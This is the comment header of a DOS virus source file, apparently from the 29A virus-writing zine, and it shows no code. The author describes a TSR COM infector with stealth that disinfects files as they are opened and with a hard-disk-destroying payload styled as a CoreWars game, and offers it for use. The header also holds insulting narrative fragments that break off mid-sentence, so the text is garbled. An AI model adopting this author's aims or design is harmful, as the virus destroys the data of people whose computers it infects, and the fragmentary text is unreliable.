;  For those  who  still  don't know  what  RedCode and CoreWars are, go and
; look for some webpage in  the net so  you'll  later understand the meaning
; and the reason  to be of this virus... otherwise you'll  feel like if  you
; were trying to understand chinese scripts :)
;
;  I started writing this virus to try to make a payload which came up to my
; mind one day  after one couple  kalimotxos ( wine+coke ) :*) and intensive
; Marilyn Manson  sessions... what  about a CoreWars game in your computer ?
; Imagine, two programs  which fight as in CoreWars, trying to make impossi-
; ble  to each other  to do  its next move and thus win the game... imagine,
; also, that this game takes place in the first sectors of your HD.
;
;  So that's the virus payload.
;
;  The payload is destructive ( because of obvious reasons, not just because
; now I like to destroy  computers  and that  stuff ). However, the user may
; skip any damage  and save  his data just  by not pressing 'enter' when the
; payload appears. By pressing the "G" key right now you will be able to see
; the NON-destructive version of the payload.
;
;  About the virus itself, it's  a 'lame TSR COM infector' which  infects on
; closing/disinfects on opening using SFTs; some kind  of 'joke virus', with
; some references to "near friends" in the code and in the comments ;-D

;                         Each time I look outside
;              my mother dies, I feel my back is changing shape
;                 When the worm consumes the boy it's never
;                             considered rape.

         ; playing with swastikas and insulting all people of different
         ; races than his; all non-AVer people
         ;
         ;   Then, his problems began. He hated VXers and only had friends

         ; day would sit right ( or was it left ? ) of God
         ;

         ; could establish terror and silence about viruses. It was
         ; wonderful: if someone liked viruses, he could just squash and
         ; silence his dirty mouth. Even, he could make that stupid

         ; that they were an alive problem... there were no limits, he got

;  And finishing this, I wanted to give an oportunity to my friend Christian;
; the oportunity of publishing a virus in this place of 29A: I told him, I can
; publish your virus in 29A ! And so I do, returning to my master in virus
; writing all I debt him, giving him my most sincerely thanks for being my
; master in viruswriting, the light that iluminated the way on my first steps
; making a Com non-tsr and that has brought me to the vast knowledge with his
; impressive wisdom.

; Ms-dos, Win3.1 in an Ms-dos window, and I dunno if Linux and Os/2 have
; that kind of windows, but... 100% destructive, of course. Doesn't have
; polymorphism cause it doesn't need it, and it's stealth "after-execution",
; autodesinfecting itself when run. Here you are...
